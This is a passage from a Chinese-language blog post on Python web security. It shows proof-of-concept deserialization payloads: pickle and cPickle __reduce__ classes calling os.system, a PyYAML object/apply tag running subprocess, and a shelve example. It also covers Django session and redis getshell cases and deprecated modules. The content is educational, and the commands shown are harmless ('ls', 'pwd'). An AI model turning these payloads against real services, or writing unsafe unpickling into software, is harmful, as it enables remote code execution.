+<p>python2 使用cPickle，python3 使用pickle，__reduce__函数会在被反序列化是执行，类似php里的__wakeup，当我们序列化了一个带有__reduce__的类时，将其反序列化即可执行__reduce__里的代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import cPickle</span><br><span class="line">a &#x3D; 1</span><br><span class="line"># Exploit that we want the target to unpickle</span><br><span class="line">class Exploit(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        global a</span><br><span class="line">        a &#x3D; 10</span><br><span class="line">        os.system(&quot;pwd&quot;)</span><br><span class="line">        return (os.system, (&#39;ls&#39;,))</span><br><span class="line">shellcode &#x3D; cPickle.dumps(Exploit())#cPickle.dumps序列化操作</span><br><span class="line">cPickle.loads(shellcode)#cPickle.loads反序列化操作</span><br><span class="line">print a</span><br></pre></td></tr></table></figure>
+
+<p>pickle用法类似</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import pickle</span><br><span class="line"># Exploit that we want the target to unpickle</span><br><span class="line">class Exploit(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (os.system, (&#39;ls&#39;,))</span><br><span class="line">shellcode &#x3D; pickle.dumps(Exploit())</span><br><span class="line">pickle.loads(shellcode)</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="http://www.freebuf.com/vuls/77591.html">Django任意代码</a>在django1.6版本前存在任意代码执行漏洞，其漏洞起因就是pickle。</p>
+<p>在django1.6以下，session默认是采用pickle执行序列号操作，在1.6及以上版本默认采用json序列化，但还需要知道SECRET_KEY以及目标采用了signed_cookies。</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">掌阅iReader某站Python漏洞挖掘</a>，通过redis写session从而反序列化getshell。</p>
+<p><strong>PyYAML 对象类型解析导致的命令执行问题：</strong></p>
+<p><a target="_blank" rel="noopener" href="http://blog.knownsec.com/2016/03/pyyaml-tags-parse-to-command-execution/">http://blog.knownsec.com/2016/03/pyyaml-tags-parse-to-command-execution/</a> </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import yaml</span><br><span class="line">content &#x3D; &#39;&#39;&#39;---</span><br><span class="line">!!python&#x2F;object&#x2F;apply:subprocess.check_output [[ls]]#subprocess.check_output父进程等待子进程完成 返回子进程向标准输出的输出结果</span><br><span class="line">...&#39;&#39;&#39;</span><br><span class="line">print yaml.load(content)</span><br></pre></td></tr></table></figure>
+
+<p>python2下结果</p>
+<p>1.py</p>
+<p><strong>init</strong>.py</p>
+<p><strong>pycache</strong></p>
+<p>……</p>
+<p>python3下结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#39;1.pyn__init__.pyn__pycache__n................</span><br></pre></td></tr></table></figure>
+
+<p><strong>shelve：</strong></p>
+<p>shelve用处是让对象持久化，但它在序列化与反序列化的过程中使用了pickle模块，因此我们可以利用shelve会调用的pickle在反序列化过程中执行代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import shelve</span><br><span class="line">import os</span><br><span class="line">class exp(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (os.system(&#39;ls&#39;))</span><br><span class="line">file &#x3D; shelve.open(&quot;test&quot;)</span><br><span class="line">file[&#39;exp&#39;] &#x3D; exp()</span><br><span class="line">print(file[&#39;exp&#39;])</span><br></pre></td></tr></table></figure>
+
+<p>一些在较新版本被弃用的函数和模块</p>
+<p><strong>rexec:</strong></p>
+<p>在python2.6后被弃用，相关<a target="_blank" rel="noopener" href="https://docs.python.org/2/library/rexec.html">文档</a>.</p>
+<p><strong>bastion:</strong></p>
+<p>在python2.6后被弃用，相关<a target="_blank" rel="noopener" href="https://docs.python.org/2/library/bastion.html">文档</a>.</p>
+<p><strong>tempfile.mktemp:</strong></p>
+<p>此函数自从2.3版本不推荐使用并使用mkstemp()代替，相关<a target="_blank" rel="noopener" href="https://docs.python.org/3/library/tempfile.html?highlight=mktemp#tempfile.mktemp">文档</a></p>
+<p><strong>总结</strong></p>
+<p>python安全还远不止上文所述部分，随之python使用者的增多，其安全性必然也会不断地收到挑战，而我们也需要从中不断学习以应对随时袭来的威胁。</p>
+<p><strong>参考文章</strong></p>
+<p><a target="_blank" rel="noopener" href="http://python.jobbole.com/82746/">http://python.jobbole.com/82746/</a> </p>
+<p><a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/web/73669.html">http://www.freebuf.com/articles/web/73669.html</a> </p>
+<p><a target="_blank" rel="noopener" href="https://virusdefender.net/index.php/archives/576/">https://virusdefender.net/index.php/archives/576/</a> </p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/337/">https://paper.seebug.org/337/</a> </p>
+<p><a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/system/89165.html">http://www.freebuf.com/articles/system/89165.html</a> </p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>future.zhangyan</span>
+                    </p>
+                
+				
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://zhangyanlady.github.io/2020/09/20/python-web-%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/">https://zhangyanlady.github.io/2020/09/20/python-web-%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>The future can be expected, the world is worth it.</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"># 网络安全</a>
+                    
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
+                    
+                        <a href="/tags/web/"># web</a>
+                    
+                        <a href="/tags/python/"># python</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/09/22/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/">中间人攻击</a>
+            
+            
+            <a class="next" rel="next" href="/2020/09/15/vue%E6%90%AD%E5%BB%BA/">vue搭建</a>
+            
+        </section>
+			</br>
+			
+
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© future.zhangyan | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+	<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</footer>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+    </div>
+
+
+	
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":200,"height":400},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
